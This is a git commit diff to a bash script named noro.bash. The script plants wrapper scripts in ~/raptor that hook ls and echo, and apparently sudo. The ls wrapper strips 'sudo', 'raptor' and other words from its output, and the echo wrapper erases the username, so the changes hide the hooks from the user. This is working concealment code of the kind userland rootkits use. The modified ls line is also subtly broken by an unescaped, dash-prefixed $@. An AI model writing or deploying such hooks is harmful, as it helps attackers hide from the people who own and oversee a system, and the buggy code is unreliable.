394c4be407cc3710595e82384825046fe6225759
kernelstearns <55107317+kernelstearns@users.noreply.github.com>
2020-01-29 16:38:43 -0700

    Update noro.bash

--- noro/noro.bash
+++ noro/noro.bash
@@ -12,12 +12,14 @@ chmod +x ~/raptor/sudo
 
 #Hook ls
 echo "#!/bin/bash" > ~/raptor/ls
-echo "/bin/ls -C --color=always \$@ | sed 's/ls//g' | sed 's/cd//g' | sed 's/sudo//g' | sed 's/raptor//g' | cat" >> ~/raptor/ls
+echo "/bin/ls -$@ -C --color=always | sed 's/ls//g' | sed 's/cd//g' | sed 's/sudo//g' | sed 's/raptor//g' | cat" >> ~/raptor/ls
 chmod +x ~/raptor/ls
 
 #Hook echo
 echo "#!/bin/bash" > ~/raptor/echo
 echo "/bin/echo $@ | sed s/$(whoami)//g" >> ~/raptor/echo
 chmod +x ~/raptor/echo
+
+alias ls=ls
 
 exec bash
